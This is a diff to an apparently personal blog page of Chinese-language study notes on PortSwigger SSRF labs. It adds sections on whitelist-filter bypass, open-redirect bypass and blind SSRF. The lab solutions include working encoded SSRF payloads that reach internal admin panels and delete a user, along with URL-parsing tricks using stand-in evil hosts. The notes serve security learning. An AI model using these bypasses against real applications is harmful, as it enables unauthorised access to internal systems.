@@ -31,7 +31,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/91Quin/-for-hexo/main/img/202403201710714.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/91Quin/-for-hexo/main/img/202403201736875.png">
 <meta property="article:published_time" content="2024-03-19T16:00:00.000Z">
-<meta property="article:modified_time" content="2024-03-20T15:02:40.584Z">
+<meta property="article:modified_time" content="2024-03-22T06:24:02.630Z">
 <meta property="article:author" content="张一剑">
 <meta property="article:tag" content="知识&#x2F;cybersecurity">
 <meta property="article:tag" content="Web">
@@ -179,10 +179,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2024-03-20 00:00:00 / 修改时间：23:02:40" itemprop="dateCreated datePublished" datetime="2024-03-20T00:00:00+08:00">2024-03-20</time>
+              <time title="创建时间：2024-03-20 00:00:00" itemprop="dateCreated datePublished" datetime="2024-03-20T00:00:00+08:00">2024-03-20</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-03-22 14:24:02" itemprop="dateModified" datetime="2024-03-22T14:24:02+08:00">2024-03-22</time>
+              </span>
 
           
 
@@ -262,6 +268,78 @@
 <li>显示管理面板后，截获数据包<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin/delete?username=carlos</span> <span class="meta">HTTP/2</span></span><br></pre></td></tr></table></figure></li>
 <li>像之前一样发送数据包即可完成。</li>
 </ol>
+<h3 id="SSRF-with-whitelist-based-input-filters"><a href="#SSRF-with-whitelist-based-input-filters" class="headerlink" title="SSRF with whitelist-based input filters"></a>SSRF with whitelist-based input filters</h3><blockquote>
+<p>You may be able to bypass this filter by exploiting inconsistencies in URL parsing.</p>
+</blockquote>
+<ul>
+<li>可以用<code>@</code>把credentials插入到hostname前边<br><code>https://expected-host:fakepassword@evil-host</code></li>
+<li>可以用<code>#</code>指明URL分片（？<br><code>https://evil-host#expected-host</code></li>
+<li>可以利用DNS域名分级（根，顶级，一级那个），来把要求的输入放入可控的，验证过的，DNS域名（？<br><code>https://expected-host.evil-host</code></li>
+<li>可以使用URL编码来混淆。特别是过滤的实现和发送后端请求的实现不大一样时。也可以使用<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings#obfuscation-via-double-url-encoding">double-encoding</a><blockquote>
+<p>[[Essential skills]]</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/blog/top-10-web-hacking-techniques-of-2017#1">A new era of SSRF</a></li>
+</ul>
+</blockquote>
+</li>
+</ul>
+<h4 id="Lab-SSRF-with-whitelist-based-input-filter"><a href="#Lab-SSRF-with-whitelist-based-input-filter" class="headerlink" title="Lab: SSRF with whitelist-based input filter"></a>Lab: <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf">SSRF</a> with whitelist-based input filter</h4><ol>
+<li>尝试<code>127.1/admin</code>并进行double encode，不成功</li>
+<li>看到response<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/2</span> <span class="number">400</span> Bad Request</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=utf-8</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>58</span><br><span class="line"></span><br><span class="line"><span class="language-smalltalk"><span class="comment">&quot;External stock check host must be stock.weliketoshop.net&quot;</span></span></span><br></pre></td></tr></table></figure></li>
+<li>看了solution，最终是使用<code>@</code>插入，并使用<code>#</code>来分片，同时需要对<code>#</code>进行double-URL encode</li>
+<li>这里判断能使用<code>@</code>，URL支持embedded credentials.是通过发送URL<code>http://username@stock.weliketoshop.net/</code></li>
+<li><code>stockApi=http%3a//localhost%3a80%2523%40stock.weliketoshop.net/admin/delete%3fusername%3dcarlos</code></li>
+</ol>
+<h3 id="Bypassing-SSRF-filters-via-open-redirection"><a href="#Bypassing-SSRF-filters-via-open-redirection" class="headerlink" title="Bypassing SSRF filters via open redirection"></a>Bypassing SSRF filters via open redirection</h3><p>如果应用的api存在重定向漏洞，就可以构建一个满足过滤规则，最终重定向到target的URL，来利用。</p>
+<p>举例 ：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/product/nextProduct?currentProductId=6&amp;path=http://evil-user.net</span><br></pre></td></tr></table></figure>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/product/stock</span> <span class="meta">HTTP/1.0</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>118</span><br><span class="line"></span><br><span class="line"><span class="language-awk">stockApi=http:<span class="regexp">//</span>weliketoshop.net<span class="regexp">/product/</span>nextProduct?currentProductId=<span class="number">6</span>&amp;path=http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">0.68</span>/admin</span></span><br></pre></td></tr></table></figure>
+<p>这种情况能通过过滤，是因为：应用首先检验提交的<code>stockAPI</code>是在一个允许的域上。</p>
+<h4 id="Lab-SSRF-with-filter-bypass-via-open-redirection-vulnerability"><a href="#Lab-SSRF-with-filter-bypass-via-open-redirection-vulnerability" class="headerlink" title="Lab: SSRF with filter bypass via open redirection vulnerability"></a>Lab: <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf">SSRF</a> with filter bypass via open redirection vulnerability</h4><ol>
+<li>这里看到<code>stockApi=%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1</code>,我初步的想法是像上述一样，加个<code>&amp;path=</code></li>
+<li>结果是正常查询，看起来后端并没有解析<code>path</code>参数。</li>
+<li>看了solution后，我意识到我找错了地方，<code>Check stock</code>并没有相应的open redirection vulnerability , 而是在<code>next product</code></li>
+<li>这里看到<code>next product</code>包<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/product/nextProduct?currentProductId=1&amp;path=/product?productId=2</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a7800870442333983d36f8000e800f3.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=zeo9BMgCcN4bjQC9fjrolDifIF0bKfmA; session=FllaMdiROXA8bis59Av3ZhGZwIbkHzVg</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;122&quot;, &quot;Not(A:Brand&quot;;v=&quot;24&quot;, &quot;Google Chrome&quot;;v=&quot;122&quot;</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Platform</span><span class="punctuation">: </span>&quot;Linux&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://0a7800870442333983d36f8000e800f3.web-security-academy.net/product?productId=1</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br></pre></td></tr></table></figure></li>
+<li>可以看到这里是存在一个<code>path</code>参数的。</li>
+<li><del>构建新的参数</del><!--
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/product/nextProduct?currentProductId=1&amp;path=http://192.168.0.12:8080/admin</span> <span class="meta">HTTP/2</span></span><br></pre></td></tr></table></figure>
+–&gt;</li>
+<li>我意识到我的问题了，我应当修改<code>stockApi</code>, 从而利用<code>/product/nextProduct</code>来实现重定向。而非是直接使用<code>GET</code>去请求，这样是没法绕过的。</li>
+<li>构建相应<code>POST</code> request<br><code>stockApi=%2fproduct%2fnextProduct%3fpath%3dhttp%3a%2f%2f192.168.0.12%3a8080%2fadmin</code></li>
+<li>成功访问管理界面</li>
+<li><code>stockApi=%2fproduct%2fnextProduct%3fpath%3dhttp%3a%2f%2f192.168.0.12%3a8080%2fadmin%2fdelete%3fusername%3dcarlos</code>构建相应 request即可</li>
+</ol>
+<h2 id="Blind-SSRF-vulnerabilities"><a href="#Blind-SSRF-vulnerabilities" class="headerlink" title="Blind SSRF vulnerabilities"></a>Blind SSRF vulnerabilities</h2><p>^69fef6</p>
+<p>我理解的是，跟sql盲注一样，能执行，但不给你返回response。这种类型的漏洞很难利用（这一点也跟SQLi差不对么），但是有时会导致RCE。</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf/blind">Finding and exploiting blind SSRF vulnerabilities</a></li>
+</ul>
+<h2 id="Finding-hidden-attack-surface-for-SSRF-vulnerabilities"><a href="#Finding-hidden-attack-surface-for-SSRF-vulnerabilities" class="headerlink" title="Finding hidden attack surface for SSRF vulnerabilities"></a>Finding hidden attack surface for SSRF vulnerabilities</h2><p>大多数SSRF漏洞都容易发现。但也有一些比较难定位的：</p>
+<h3 id="Partial-URLs-in-requests"><a href="#Partial-URLs-in-requests" class="headerlink" title="Partial URLs in requests"></a>Partial URLs in requests</h3><p>这种就是只在request参数中放hostname或者部分URL，到服务端再拼接成完整的。因为没办法控制整个URL，所以可能有点难利用。</p>
+<h3 id="URLs-within-data-formats"><a href="#URLs-within-data-formats" class="headerlink" title="URLs within data formats"></a>URLs within data formats</h3><p>一些应用可能采用特定的格式传输URL，比方说XML。如果用XML格式的话，可能就存在 <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe">XXE injection</a>漏洞。</p>
+<h3 id="SSRF-via-the-Referer-header"><a href="#SSRF-via-the-Referer-header" class="headerlink" title="SSRF via the Referer header"></a>SSRF via the Referer header</h3><p>一些应用在服务端会有分析软件来记录访客。这些软件通常会记录请求中的Referer头，而且通常会访问Referer头中的任意第三方URL，以此分析这些网站的内容。因此，Referer头就可能是一个非常有效的SSRF攻击面。</p>
+<h1 id="Blind-SSRF-vulnerabilities-1"><a href="#Blind-SSRF-vulnerabilities-1" class="headerlink" title="Blind SSRF vulnerabilities"></a>Blind SSRF vulnerabilities</h1><h2 id="What-is-blind-SSRF"><a href="#What-is-blind-SSRF" class="headerlink" title="What is blind SSRF?"></a>What is blind SSRF?</h2><p>[[#^69fef6]]</p>
+<h2 id="What-is-the-impact-of-blind-SSRF-vulnerabilities"><a href="#What-is-the-impact-of-blind-SSRF-vulnerabilities" class="headerlink" title="What is the impact of blind SSRF vulnerabilities?"></a>What is the impact of blind SSRF vulnerabilities?</h2><blockquote>
+<p>The impact of blind SSRF vulnerabilities is often lower than fully informed SSRF vulnerabilities because of their one-way nature.</p>
+</blockquote>
+<p>哦，影响是不如“fully informed”，虽然有些情况下可以实现RCE，但是没办法泄露敏感信息。</p>
+<h2 id="How-to-find-and-exploit-blind-SSRF-vulnerabilities"><a href="#How-to-find-and-exploit-blind-SSRF-vulnerabilities" class="headerlink" title="How to find and exploit blind SSRF vulnerabilities"></a>How to find and exploit blind SSRF vulnerabilities</h2><p>探测blind SSRF漏洞最可靠的方式是，使用<code>out-of-band</code><a target="_blank" rel="noopener" href="https://portswigger.net/burp/application-security-testing/oast">OAST</a>技术。就是想办法向攻击者控制的外部系统发送HTTP请求。</p>
+<p>它这里推荐了一个 <a target="_blank" rel="noopener" href="https://portswigger.net/burp/documentation/collaborator">Burp Collaborator</a> ， 可以生成唯一的域名，payloads， 监控与域名的交互活动。</p>
+<blockquote>
+<p>这里还提到一个特征是：观察到DNS look-up， 但是没有后续的HTTP请求。这就表示，应用试图发送request，然后就先DNS lookup，但是HTTP request被network-level filtering过滤掉了。</p>
+</blockquote>
+<p>由于这个“blind”，所以没法去浏览系统上的内容。但是可以用blind SSRF去进一步地探测内部网络，尝试去发送一些波及范围比较广的其它漏洞的payload。</p>
+<p>另一个利用blind SSRF漏洞的目的就是去，诱导应用连接到攻击者控制的系统，然后攻击者借此返回恶意response。</p>
+<h4 id="Lab-Blind-SSRF-with-out-of-band-detection"><a href="#Lab-Blind-SSRF-with-out-of-band-detection" class="headerlink" title="Lab: Blind SSRF with out-of-band detection"></a>Lab: <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf/blind">Blind SSRF</a> with out-of-band detection</h4><p>这个就是上述的referer类型[[#SSRF via the Referer header ]]，这个实验室也是利用Burp Collaborator的。</p>
+<ol>
+<li>这个连<code>checkstock</code>都没有</li>
+<li>截获查看产品的<code>GET</code>request，送去repeater，选中<code>Referer</code>，右键<code>Insert Collaborator Payload</code> , 然后发送</li>
+<li>去<code>collaborator</code>查看，结果我啥也没看到。emmm，看了下event log，觉得是不是我没挂代理的问题。</li>
+<li>上设置里跑了个health check，结果全红。把代理那边<code>do dns lookups over socks proxy</code>选上了，解决了一些问题，但是SMTP connection 还是会报错。</li>
+<li>按理说这也不应该啥都搜不到？这个lab也用不到smtp啊</li>
+<li>看了community solution ,也没法发现自己怎么不对。以后有机会自建collaborator 再试试把。</li>
+</ol>
+<h4 id="Lab-Blind-SSRF-with-Shellshock-exploitation"><a href="#Lab-Blind-SSRF-with-Shellshock-exploitation" class="headerlink" title="Lab: Blind SSRF with Shellshock exploitation"></a>Lab: <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf/blind">Blind SSRF</a> with Shellshock exploitation</h4><p>也是会用到<code>collaborator</code>，直接不做了。</p>
 
     </div>
 
@@ -345,7 +423,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#What-is-SSRF"><span class="nav-number">1.</span> <span class="nav-text">What is SSRF?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#What-is-the-impact-of-SSRF-attacks"><span class="nav-number">2.</span> <span class="nav-text">What is the impact of SSRF attacks?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Common-SSRF-attacks"><span class="nav-number">3.</span> <span class="nav-text">Common SSRF attacks</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF-attacks-against-the-server"><span class="nav-number">3.1.</span> <span class="nav-text">SSRF attacks against the server</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-Basic-SSRF-against-the-local-server"><span class="nav-number">3.1.1.</span> <span class="nav-text">Lab: Basic SSRF against the local server</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF-attacks-against-other-back-end-systems"><span class="nav-number">3.2.</span> <span class="nav-text">SSRF attacks against other back-end systems</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-Basic-SSRF-against-another-back-end-system"><span class="nav-number">3.2.1.</span> <span class="nav-text">Lab: Basic SSRF against another back-end system</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Circumventing-common-SSRF-defenses"><span class="nav-number">4.</span> <span class="nav-text">Circumventing common SSRF defenses</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF-with-blacklist-based-input-filters"><span class="nav-number">4.1.</span> <span class="nav-text">SSRF with blacklist-based input filters</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-SSRF-with-blacklist-based-input-filter"><span class="nav-number">4.1.1.</span> <span class="nav-text">Lab: SSRF with blacklist-based input filter</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#What-is-SSRF"><span class="nav-number">1.</span> <span class="nav-text">What is SSRF?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#What-is-the-impact-of-SSRF-attacks"><span class="nav-number">2.</span> <span class="nav-text">What is the impact of SSRF attacks?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Common-SSRF-attacks"><span class="nav-number">3.</span> <span class="nav-text">Common SSRF attacks</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF-attacks-against-the-server"><span class="nav-number">3.1.</span> <span class="nav-text">SSRF attacks against the server</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-Basic-SSRF-against-the-local-server"><span class="nav-number">3.1.1.</span> <span class="nav-text">Lab: Basic SSRF against the local server</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF-attacks-against-other-back-end-systems"><span class="nav-number">3.2.</span> <span class="nav-text">SSRF attacks against other back-end systems</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-Basic-SSRF-against-another-back-end-system"><span class="nav-number">3.2.1.</span> <span class="nav-text">Lab: Basic SSRF against another back-end system</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Circumventing-common-SSRF-defenses"><span class="nav-number">4.</span> <span class="nav-text">Circumventing common SSRF defenses</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF-with-blacklist-based-input-filters"><span class="nav-number">4.1.</span> <span class="nav-text">SSRF with blacklist-based input filters</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-SSRF-with-blacklist-based-input-filter"><span class="nav-number">4.1.1.</span> <span class="nav-text">Lab: SSRF with blacklist-based input filter</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF-with-whitelist-based-input-filters"><span class="nav-number">4.2.</span> <span class="nav-text">SSRF with whitelist-based input filters</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-SSRF-with-whitelist-based-input-filter"><span class="nav-number">4.2.1.</span> <span class="nav-text">Lab: SSRF with whitelist-based input filter</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Bypassing-SSRF-filters-via-open-redirection"><span class="nav-number">4.3.</span> <span class="nav-text">Bypassing SSRF filters via open redirection</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-SSRF-with-filter-bypass-via-open-redirection-vulnerability"><span class="nav-number">4.3.1.</span> <span class="nav-text">Lab: SSRF with filter bypass via open redirection vulnerability</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
